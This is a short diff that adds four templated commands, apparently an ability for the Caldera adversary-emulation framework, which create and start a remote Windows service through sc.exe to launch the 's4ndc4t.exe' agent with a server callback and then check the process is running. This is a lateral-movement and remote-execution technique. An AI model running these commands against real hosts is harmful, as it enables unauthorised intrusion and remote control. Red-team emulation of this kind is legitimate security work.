@@ -1,0 +1,4 @@
+sc.exe \\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";
+sc.exe \\#{remote.host.fqdn} start sandsvc;
+Start-Sleep -s 15;
+Get-Process -ComputerName #{remote.host.fqdn} s4ndc4t;
